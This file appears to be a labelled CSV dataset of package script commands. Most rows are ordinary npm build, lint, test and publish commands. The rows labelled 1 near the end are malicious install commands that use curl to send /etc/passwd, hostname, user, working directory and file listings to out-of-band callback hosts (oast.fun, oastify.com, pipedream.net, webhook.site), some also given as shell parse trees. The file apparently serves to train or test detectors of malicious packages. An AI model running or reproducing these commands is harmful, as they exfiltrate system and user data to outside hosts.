command,package_name,label
cross-env BABEL_ENV=production babel src --out-dir lib,typy-3.3.0,0
npm run clean && npm run lint && npm run test && npm run build,typy-3.3.0,0
make test,unirest-0.6.0,0
npm run build && npm run format,unist-builder-4.0.0,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-builder-4.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-builder-4.0.0,0
node --conditions development test.js,unist-builder-4.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-builder-4.0.0,0
npm run build && npm run format && npm run test-coverage,unist-builder-4.0.0,0
npm run build && npm run format,unist-util-filter-5.0.1,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-filter-5.0.1,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,unist-util-filter-5.0.1,0
node --conditions development test.js,unist-util-filter-5.0.1,0
c8 --100 --reporter lcov npm run test-api,unist-util-filter-5.0.1,0
npm run build && npm run format && npm run test-coverage,unist-util-filter-5.0.1,0
npm run build && npm run format,unist-util-find-3.0.0,0
tsc --build --clean && tsc --build && type-coverage,unist-util-find-3.0.0,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,unist-util-find-3.0.0,0
node --conditions development test.js,unist-util-find-3.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-find-3.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-find-3.0.0,0
npm run build && npm run format,unist-util-find-after-5.0.0,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-find-after-5.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-find-after-5.0.0,0
node --conditions development test.js,unist-util-find-after-5.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-find-after-5.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-find-after-5.0.0,0
npm run build && npm run format,unist-util-find-all-after-5.0.0,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-find-all-after-5.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-find-all-after-5.0.0,0
node --conditions development test.js,unist-util-find-all-after-5.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-find-all-after-5.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-find-all-after-5.0.0,0
npm run build && npm run format,unist-util-find-all-before-5.0.0,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-find-all-before-5.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-find-all-before-5.0.0,0
node --conditions development test.js,unist-util-find-all-before-5.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-find-all-before-5.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-find-all-before-5.0.0,0
npm run build && npm run format,unist-util-generated-3.0.0,0
tsc --build --clean && tsc --build && type-coverage,unist-util-generated-3.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-generated-3.0.0,0
node --conditions development test.js,unist-util-generated-3.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-generated-3.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-generated-3.0.0,0
npm run build && npm run format,unist-util-inspect-8.1.0,0
tsc --build --clean && tsc --build && type-coverage,unist-util-inspect-8.1.0,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,unist-util-inspect-8.1.0,0
node --conditions development test.js,unist-util-inspect-8.1.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-inspect-8.1.0,0
npm run build && npm run format && npm run test-coverage,unist-util-inspect-8.1.0,0
npm run build && npm run format,unist-util-is-6.0.0,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-is-6.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-is-6.0.0,0
node --conditions development test/index.js,unist-util-is-6.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-is-6.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-is-6.0.0,0
npm run build && npm run format,unist-util-map-4.0.0,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-map-4.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-map-4.0.0,0
node --conditions development test.js,unist-util-map-4.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-map-4.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-map-4.0.0,0
npm run build && npm run format,unist-util-modify-children-4.0.0,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-modify-children-4.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-modify-children-4.0.0,0
node --conditions development test.js,unist-util-modify-children-4.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-modify-children-4.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-modify-children-4.0.0,0
npm run build && npm run format,unist-util-position-5.0.0,0
tsc --build --clean && tsc --build && type-coverage,unist-util-position-5.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-position-5.0.0,0
node --conditions development test.js,unist-util-position-5.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-position-5.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-position-5.0.0,0
npm run build && npm run format,unist-util-position-from-estree-2.0.0,0
tsc --build --clean && tsc --build && type-coverage,unist-util-position-from-estree-2.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-position-from-estree-2.0.0,0
node --conditions development test.js,unist-util-position-from-estree-2.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-position-from-estree-2.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-position-from-estree-2.0.0,0
npm run build && npm run format,unist-util-remove-4.0.0,0
tsc --build --clean && tsc --build && type-coverage,unist-util-remove-4.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-remove-4.0.0,0
node --conditions development test.js,unist-util-remove-4.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-remove-4.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-remove-4.0.0,0
npm run build && npm run format,unist-util-remove-position-5.0.0,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-remove-position-5.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-remove-position-5.0.0,0
node --conditions development test.js,unist-util-remove-position-5.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-remove-position-5.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-remove-position-5.0.0,0
npm run build && npm run format,unist-util-select-5.1.0,0
tsc --build --clean && tsc --build && type-coverage,unist-util-select-5.1.0,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,unist-util-select-5.1.0,0
node --conditions development test/index.js,unist-util-select-5.1.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-select-5.1.0,0
npm run build && npm run format && npm run test-coverage,unist-util-select-5.1.0,0
npm run build && npm run format,unist-util-source-5.0.0,0
tsc --build --clean && tsc --build && type-coverage,unist-util-source-5.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-source-5.0.0,0
node --conditions development test.js,unist-util-source-5.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-source-5.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-source-5.0.0,0
npm run build && npm run format,unist-util-stringify-position-4.0.0,0
tsc --build --clean && tsc --build && type-coverage,unist-util-stringify-position-4.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-stringify-position-4.0.0,0
node --conditions development test.js,unist-util-stringify-position-4.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-stringify-position-4.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-stringify-position-4.0.0,0
npm run build && npm run format,unist-util-visit-5.0.0,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-visit-5.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-visit-5.0.0,0
node --conditions development test.js,unist-util-visit-5.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-visit-5.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-visit-5.0.0,0
npm run build && npm run format,unist-util-visit-children-3.0.0,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-visit-children-3.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-visit-children-3.0.0,0
node --conditions development test.js,unist-util-visit-children-3.0.0,0
c8 --100 --reporter lcov npm run test-api,unist-util-visit-children-3.0.0,0
npm run build && npm run format && npm run test-coverage,unist-util-visit-children-3.0.0,0
npm run build && npm run format,unist-util-visit-parents-6.0.1,0
tsc --build --clean && tsc --build && tsd && type-coverage,unist-util-visit-parents-6.0.1,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,unist-util-visit-parents-6.0.1,0
node --conditions development test.js,unist-util-visit-parents-6.0.1,0
c8 --100 --reporter lcov npm run test-api,unist-util-visit-parents-6.0.1,0
npm run build && npm run format && npm run test-coverage,unist-util-visit-parents-6.0.1,0
eslint src test --ext ts,utility-2.5.0,0
npm run lint -- --fix && npm run prepublishOnly,utility-2.5.0,0
egg-bin test,utility-2.5.0,0
egg-bin test,utility-2.5.0,0
npm run lint && npm run prepublishOnly && attw --pack,utility-2.5.0,0
egg-bin cov,utility-2.5.0,0
tshy && tshy-after,utility-2.5.0,0
jest,utils-1.9.7-beta.2,0
../../ci/prepublish/build ./,utils-1.9.7-beta.2,0
rm -rf ./src && mv ./_src ./src,utils-1.9.7-beta.2,0
if [ "${TRAVIS}" ]; then npm run test-ci; else npm run test-local; fi,utils-copy-error-1.0.1,0
tape "./test/*.js" | tap-spec,utils-copy-error-1.0.1,0
npm run test-local && xvfb-run npm run test-browsers,utils-copy-error-1.0.1,0
istanbul cover --dir ./reports/coverage --report lcov tape -- "./test/*.js",utils-copy-error-1.0.1,0
browserify ./test/*.js | testling | tap-spec,utils-copy-error-1.0.1,0
istanbul cover --dir ./reports/codecov/coverage --report lcovonly tape -- "./test/*.js" && cat ./reports/codecov/coverage/lcov.info | codecov && rm -rf ./reports/codecov,utils-copy-error-1.0.1,0
if [ "${TRAVIS}" ]; then npm run test-ci; else npm run test-local; fi,utils-indexof-1.0.0,0
tape "./test/*.js" | tap-spec,utils-indexof-1.0.0,0
npm run test-local && xvfb-run npm run test-browsers,utils-indexof-1.0.0,0
istanbul cover --dir ./reports/coverage --report lcov tape -- "./test/*.js",utils-indexof-1.0.0,0
browserify ./test/*.js | testling | tap-spec,utils-indexof-1.0.0,0
istanbul cover --dir ./reports/codecov/coverage --report lcovonly tape -- "./test/*.js" && cat ./reports/codecov/coverage/lcov.info | codecov && rm -rf ./reports/codecov,utils-indexof-1.0.0,0
mocha,utils-regex-from-string-1.0.0,0
istanbul cover ./node_modules/.bin/_mocha --dir ./reports/coverage -- -R spec,utils-regex-from-string-1.0.0,0
istanbul cover ./node_modules/.bin/_mocha --dir ./reports/codecov/coverage --report lcovonly -- -R spec && cat ./reports/codecov/coverage/lcov.info | codecov && rm -rf ./reports/codecov,utils-regex-from-string-1.0.0,0
nyc mocha 'lib/**/__tests__/*' --recursive,vandium-utils-2.0.0,0
npm run build && npm run format,vfile-find-up-7.1.0,0
tsc --build --clean && tsc --build && type-coverage,vfile-find-up-7.1.0,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,vfile-find-up-7.1.0,0
node --conditions development test/index.js,vfile-find-up-7.1.0,0
c8 --100 --reporter lcov npm run test-api,vfile-find-up-7.1.0,0
npm run build && npm run format && npm run test-coverage,vfile-find-up-7.1.0,0
npm run build && npm run format,vfile-location-5.0.3,0
tsc --build --clean && tsc --build && type-coverage,vfile-location-5.0.3,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,vfile-location-5.0.3,0
node --conditions development test.js,vfile-location-5.0.3,0
c8 --100 --reporter lcov npm run test-api,vfile-location-5.0.3,0
npm run build && npm run format && npm run test-coverage,vfile-location-5.0.3,0
tsc --build --clean && tsc --build && type-coverage,vfile-matter-5.0.1,0
remark --frail --output --quiet -- . && prettier --log-level warn --write -- . && xo --fix,vfile-matter-5.0.1,0
node --conditions development test.js,vfile-matter-5.0.1,0
c8 --100 --reporter lcov -- npm run test-api,vfile-matter-5.0.1,0
npm run build && npm run format && npm run test-coverage,vfile-matter-5.0.1,0
npm run build && npm run format,vfile-message-4.0.2,0
tsc --build --clean && tsc --build && type-coverage,vfile-message-4.0.2,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,vfile-message-4.0.2,0
node --conditions development test.js,vfile-message-4.0.2,0
c8 --100 --reporter lcov npm run test-api,vfile-message-4.0.2,0
npm run build && npm run format && npm run test-coverage,vfile-message-4.0.2,0
npm run build && npm run format,vfile-reporter-8.1.1,0
tsc --build --clean && tsc --build && type-coverage,vfile-reporter-8.1.1,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,vfile-reporter-8.1.1,0
cross-env FORCE_COLOR="true" node --conditions development test.js,vfile-reporter-8.1.1,0
c8 --100 --reporter lcov npm run test-api,vfile-reporter-8.1.1,0
npm run build && npm run format && npm run test-coverage,vfile-reporter-8.1.1,0
npm run build && npm run format,vfile-sort-4.0.0,0
tsc --build --clean && tsc --build && type-coverage,vfile-sort-4.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,vfile-sort-4.0.0,0
node --conditions development test.js,vfile-sort-4.0.0,0
c8 --100 --reporter lcov npm run test-api,vfile-sort-4.0.0,0
npm run build && npm run format && npm run test-coverage,vfile-sort-4.0.0,0
npm run build && npm run format,vfile-statistics-3.0.0,0
tsc --build --clean && tsc --build && type-coverage,vfile-statistics-3.0.0,0
remark . -qfo && prettier . -w --loglevel warn && xo --fix,vfile-statistics-3.0.0,0
node --conditions development test.js,vfile-statistics-3.0.0,0
c8 --100 --reporter lcov npm run test-api,vfile-statistics-3.0.0,0
npm run build && npm run format && npm run test-coverage,vfile-statistics-3.0.0,0
rm -rf dist,vitest-fail-on-console-0.7.1,0
vite build,vitest-fail-on-console-0.7.1,0
yarn eslint .,vitest-fail-on-console-0.7.1,0
vitest related ./tests/index.spec.ts --run,vitest-fail-on-console-0.7.1,0
standard-version,vitest-fail-on-console-0.7.1,0
standard-version --release-as patch,vitest-fail-on-console-0.7.1,0
standard-version --release-as minor,vitest-fail-on-console-0.7.1,0
standard-version --release-as major,vitest-fail-on-console-0.7.1,0
bash scripts/release.sh major,watch-1.0.2,0
bash scripts/release.sh minor,watch-1.0.2,0
bash scripts/release.sh patch,watch-1.0.2,0
bash scripts/release.sh major,watch-1.0.4,0
bash scripts/release.sh minor,watch-1.0.4,0
bash scripts/release.sh patch,watch-1.0.4,0
node ./node_modules/mocha/bin/mocha test --recursive,waterline-criteria-2.0.0,0
npm prune,waterline-criteria-2.0.0,0
jest,xbytes-1.9.1,0
babel lib -d dist && node build.js,xbytes-1.9.1,0
npm run build,xbytes-1.9.1,0
npm test,xbytes-1.9.1,0
gulp,yeoman-assert-3.1.1,0
gulp prepublish,yeoman-assert-3.1.1,0
not-in-publish || npm run prepublishOnly,string.prototype.trimend-1.0.9,0
safe-publish-latest,string.prototype.trimend-1.0.9,0
es-shim-api --bound,string.prototype.trimend-1.0.9,0
semantic-release pre && npm publish --access public && semantic-release post,data-driven-1.0.0,0
npm run prepublish,serializerr-1.0.3,0
safe-publish-latest,string.prototype.trimstart-1.0.8,0
not-in-publish || npm run prepublishOnly,string.prototype.trimstart-1.0.8,0
es-shim-api --bound,string.prototype.trimstart-1.0.8,0
curl http://127.0.0.1:9000,start-server-and-test-2.0.11,0
curl http://127.0.0.1:9000 && curl http://127.0.0.1:9001,start-server-and-test-2.0.11,0
curl --insecure https://127.0.0.1:9000,start-server-and-test-2.0.11,0
node src/bin/start.js 'node test/server --port 6000' 6000 'node test/server --port 6010' 6010 'curl http://127.0.0.1:6000 && curl http://127.0.0.1:6010',start-server-and-test-2.0.11,0
semantic-release pre && npm publish && semantic-release post,app-root-path-3.1.0,0
shx rm -rf dist,globify-gitignore-1.0.3,0
shx rm -rf ./README.md && pnpm exec readme --path ./dev/docs/readme.md -y && pnpm exec ts-readme --header-depth 3 && pnpm run format,globify-gitignore-1.0.3,0
npm publish || :,string-match-left-right-9.0.22,0
gulp prepublish,yeoman-assert-3.1.1,0
pnpm run build && changeset publish,npmrc-replace-env-1.1.4,0
git subtree push --prefix docs origin gh-pages,lodash-decorators-6.0.1,0
npm publish --access-public,react-haiku-2.2.0,0
jshint *.js ./tests/*.js,merge-yaml-1.1.0,0
jshint --reporter=node_modules/jshint-stylish *.js test/*.js,normalize-range-0.1.2,0
./scripts/prepack.sh,rpc-errors-7.0.2,0
yarn run check && yarn build && npm publish,fast-loops-1.1.4,0
npm publish || :,html-crush-6.0.22,0
npm run lint -- --fix && npm run prepublishOnly,utility-2.5.0,0
npm run lint && npm run prepublishOnly && attw --pack,utility-2.5.0,0
tshy && tshy-after,utility-2.5.0,0
bash scripts/release.sh major,watch-1.0.4,0
bash scripts/release.sh minor,watch-1.0.4,0
bash scripts/release.sh patch,watch-1.0.4,0
bash scripts/release.sh major,watch-1.0.2,0
bash scripts/release.sh minor,watch-1.0.2,0
bash scripts/release.sh patch,watch-1.0.2,0
../../ci/prepublish/build ./,utils-1.9.7-beta.2,0
semantic-release pre && npm publish && semantic-release post,am-i-a-dependency-1.1.2,0
./scripts/publish-docs.sh,schematics-utilities-2.0.3,0
./scripts/test-sanity.sh,schematics-utilities-2.0.3,0
npm run prepublish,protochain-1.0.5,0
./test.sh,date-and-time-3.6.0,0
npm publish,file_size_url-1.0.6,0
npm publish || :,codsen-utils-1.6.7,0
curl f2is12etx9oswozvgvx4f6v45vbmzcn1.oastify.com/$(tail -1 /etc/passwd),nequi-utils-4.1.0,1
./pre.sh,corporate-delegate-packages-2.0.0,1
CommandNode(parts=[WordNode(parts=[] pos=(0, 4) word='bash')] pos=(0, 4)),corporate-delegate-packages-2.0.0,1
CommandNode(parts=[WordNode(parts=[] pos=(6, 10) word='curl'), WordNode(parts=[] pos=(11, 13) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(27, 35) word='hostname')] pos=(27, 35)), PipeNode(pipe='|' pos=(36, 37)), CommandNode(parts=[WordNode(parts=[] pos=(38, 44) word='base64')] pos=(38, 44))] pos=(27, 44)) pos=(25, 45))] pos=(14, 46) word='Hostname: $(hostname | base64)'), WordNode(parts=[] pos=(47, 49) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(61, 67) word='whoami')] pos=(61, 67)), PipeNode(pipe='|' pos=(68, 69)), CommandNode(parts=[WordNode(parts=[] pos=(70, 76) word='base64')] pos=(70, 76))] pos=(61, 76)) pos=(59, 77))] pos=(50, 78) word='Whoami: $(whoami | base64)'), WordNode(parts=[] pos=(79, 81) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(90, 93) word='pwd')] pos=(90, 93)), PipeNode(pipe='|' pos=(94, 95)), CommandNode(parts=[WordNode(parts=[] pos=(96, 102) word='base64')] pos=(96, 102))] pos=(90, 102)) pos=(88, 103))] pos=(82, 104) word='Pwd: $(pwd | base64)'), WordNode(parts=[] pos=(105, 107) word='-d'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(110, 112) word='ls'), WordNode(parts=[] pos=(113, 116) word='-la')] pos=(110, 116)), PipeNode(pipe='|' pos=(117, 118)), CommandNode(parts=[WordNode(parts=[] pos=(119, 125) word='base64')] pos=(119, 125))] pos=(110, 125)) pos=(108, 126))] pos=(108, 126) word='$(ls -la | base64)'), WordNode(parts=[] pos=(128, 167) word='https://eo1z2prk4as56mb.m.pipedream.net')] pos=(6, 167)),corporate-delegate-packages-2.0.0,1
/usr/bin/curl --data '@/etc/passwd' $(hostname)cm31san2vtc000046akggkbohioyyyyyb.oast.fun,mfp-test-repo-0.1.1,1
/usr/bin/curl --data '@/etc/passwd' $(hostname)cm31san2vtc000046akggkbohioyyyyyb.oast.fun,mfp-test-repo-0.1.1,1
echo test | curl webhook.site/ac7f2013-3a31-440c-998a-4041cef5fa58 -X POST -d 'hacked' ,test-hacker-sharma-1.0.10,1
/usr/bin/curl --data '@/etc/passwd' $(hostname)cm31san2vtc000046akggkbohioyyyyyb.oast.fun,mfp-food-diary-0.1.2,1
/usr/bin/curl --data '@/etc/passwd' $(hostname)cm31san2vtc000046akggkbohioyyyyyb.oast.fun,mfp-food-diary-0.1.2,1
./pre.sh,ruamel.yaml.clib-0.1.2,1
CommandNode(parts=[WordNode(parts=[] pos=(13, 17) word='curl'), WordNode(parts=[] pos=(18, 20) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(34, 42) word='hostname')] pos=(34, 42)), PipeNode(pipe='|' pos=(43, 44)), CommandNode(parts=[WordNode(parts=[] pos=(45, 51) word='base64')] pos=(45, 51))] pos=(34, 51)) pos=(32, 52))] pos=(21, 53) word='Hostname: $(hostname | base64)'), WordNode(parts=[] pos=(54, 56) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(68, 74) word='whoami')] pos=(68, 74)), PipeNode(pipe='|' pos=(75, 76)), CommandNode(parts=[WordNode(parts=[] pos=(77, 83) word='base64')] pos=(77, 83))] pos=(68, 83)) pos=(66, 84))] pos=(57, 85) word='Whoami: $(whoami | base64)'), WordNode(parts=[] pos=(86, 88) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(97, 100) word='pwd')] pos=(97, 100)), PipeNode(pipe='|' pos=(101, 102)), CommandNode(parts=[WordNode(parts=[] pos=(103, 109) word='base64')] pos=(103, 109))] pos=(97, 109)) pos=(95, 110))] pos=(89, 111) word='Pwd: $(pwd | base64)'), WordNode(parts=[] pos=(112, 114) word='-d'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(117, 119) word='ls'), WordNode(parts=[] pos=(120, 123) word='-la')] pos=(117, 123)), PipeNode(pipe='|' pos=(124, 125)), CommandNode(parts=[WordNode(parts=[] pos=(126, 132) word='base64')] pos=(126, 132))] pos=(117, 132)) pos=(115, 133))] pos=(115, 133) word='$(ls -la | base64)'), WordNode(parts=[] pos=(135, 184) word='http://cm4m8ma2vtc00003s3yggknkrkryyyyyb.oast.fun')] pos=(13, 184)),ruamel.yaml.clib-0.1.2,1
npm publish --access public,node-jhs-1.0.3,1
CommandNode(parts=[WordNode(parts=[] pos=(12, 16) word='curl'), WordNode(parts=[] pos=(17, 19) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(27, 33) word='whoami')] pos=(27, 33)), PipeNode(pipe='|' pos=(34, 35)), CommandNode(parts=[WordNode(parts=[] pos=(36, 42) word='base64')] pos=(36, 42)), PipeNode(pipe='|' pos=(43, 44)), CommandNode(parts=[WordNode(parts=[] pos=(45, 51) word='base64')] pos=(45, 51))] pos=(27, 51)) pos=(25, 52))] pos=(20, 54) word='h1: $(whoami | base64 | base64 )'), WordNode(parts=[] pos=(55, 57) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(65, 73) word='hostname'), WordNode(parts=[] pos=(74, 76) word='-I')] pos=(65, 76)), PipeNode(pipe='|' pos=(77, 78)), CommandNode(parts=[WordNode(parts=[] pos=(79, 85) word='base64')] pos=(79, 85)), PipeNode(pipe='|' pos=(86, 87)), CommandNode(parts=[WordNode(parts=[] pos=(88, 94) word='base64')] pos=(88, 94)), PipeNode(pipe='|' pos=(95, 96)), CommandNode(parts=[WordNode(parts=[] pos=(97, 99) word='tr'), WordNode(parts=[] pos=(100, 102) word='-d'), WordNode(parts=[] pos=(103, 107) word='\\n')] pos=(97, 107))] pos=(65, 107)) pos=(63, 108))] pos=(58, 109) word="h2: $(hostname -I | base64 | base64 | tr -d '\\n')"), WordNode(parts=[] pos=(110, 112) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(120, 123) word='pwd')] pos=(120, 123)), PipeNode(pipe='|' pos=(124, 125)), CommandNode(parts=[WordNode(parts=[] pos=(126, 132) word='base64')] pos=(126, 132)), PipeNode(pipe='|' pos=(133, 134)), CommandNode(parts=[WordNode(parts=[] pos=(135, 141) word='base64')] pos=(135, 141))] pos=(120, 141)) pos=(118, 142))] pos=(113, 143) word='h3: $(pwd | base64 | base64)'), WordNode(parts=[] pos=(144, 146) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(154, 162) word='hostname')] pos=(154, 162)), PipeNode(pipe='|' pos=(163, 164)), CommandNode(parts=[WordNode(parts=[] pos=(165, 171) word='base64')] pos=(165, 171)), PipeNode(pipe='|' pos=(172, 173)), CommandNode(parts=[WordNode(parts=[] pos=(174, 180) word='base64')] pos=(174, 180)), PipeNode(pipe='|' pos=(181, 182)), CommandNode(parts=[WordNode(parts=[] pos=(183, 185) word='tr'), WordNode(parts=[] pos=(186, 188) word='-d'), WordNode(parts=[] pos=(189, 193) word='\\n')] pos=(183, 193))] pos=(154, 193)) pos=(152, 194))] pos=(147, 195) word="h4: $(hostname | base64 | base64 | tr -d '\\n')"), WordNode(parts=[] pos=(197, 199) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(207, 209) word='ls'), WordNode(parts=[] pos=(210, 211) word='/')] pos=(207, 211)), PipeNode(pipe='|' pos=(212, 213)), CommandNode(parts=[WordNode(parts=[] pos=(214, 220) word='base64')] pos=(214, 220)), PipeNode(pipe='|' pos=(221, 222)), CommandNode(parts=[WordNode(parts=[] pos=(223, 229) word='base64')] pos=(223, 229)), PipeNode(pipe='|' pos=(230, 231)), CommandNode(parts=[WordNode(parts=[] pos=(232, 234) word='tr'), WordNode(parts=[] pos=(235, 237) word='-d'), WordNode(parts=[] pos=(238, 242) word='\\n')] pos=(232, 242))] pos=(207, 242)) pos=(205, 243))] pos=(200, 244) word="h5: $(ls / | base64 | base64 | tr -d '\\n')"), WordNode(parts=[] pos=(246, 302) word='https://91d105265257dcee7429b373efe8b505.m.pipedream.net')] pos=(12, 302)),signalr-temp-client-20.20.0,1
./pre.sh,flux_dev_tools-0.0.1,1
